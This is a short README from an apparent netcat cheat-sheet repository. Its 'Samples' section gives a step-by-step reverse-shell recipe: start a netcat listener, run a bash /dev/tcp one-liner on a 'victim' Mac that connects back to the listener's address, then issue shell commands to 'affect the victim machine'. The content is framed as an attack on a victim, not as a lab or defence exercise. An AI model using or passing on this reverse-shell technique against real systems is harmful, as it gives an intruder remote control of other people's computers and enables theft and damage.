## How to use netcat

You can find some sheet and samples in the [Readme](https://github.com/doctordeep/netcat_cheat_sheet_v1/tree/master/readme) folder

## Samples

Victim OSx machine:
1. Open a **listener** on your machine run in shell (linux) `nc -l -p 1337`
2. run `bash -i >& /dev/tcp/listener_ip_address/1337 0>&1` on mac shell **victim** machine (remember to add the ip address of the listener) 
3. **Use shell commands** from your listener machine to affect the victim machine
